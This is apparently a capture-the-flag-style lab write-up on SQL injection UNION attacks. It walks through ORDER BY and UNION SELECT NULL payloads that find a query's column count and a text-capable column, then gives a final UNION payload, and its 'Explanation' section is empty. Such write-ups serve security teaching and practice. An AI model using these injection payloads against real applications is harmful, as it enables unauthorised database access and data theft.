# SQL injection UNION attack, finding a column containing text

## 📍 Goal
Determine
- Number of columns in the query  
- Which column supports string data  

Then use a UNION attack to display a provided value in the response.

## 🔍 Step 1: Find number of columns

Option # 1 Use ORDER BY to test columns:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```
option #2 Use NULL
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```
Both methods worked correctly.
Error appeared at 4 columns → the query has 3 columns.

## 🔍 Step 2: Find column with data type string
```sql
'UNION SELECT 'a', NULL, NULL--
'UNION SELECT NULL, 'a', NULL--
'UNION SELECT NULL, NULL, 'a'--
```
First payload → error
Second payload → worked successfully
This means the second column supports string data and the value 'a' appeared in the response.

## 💥Exploit
```
' UNION SELECT NULL, 'payload', NULL--

```

## 🧠 Explanation

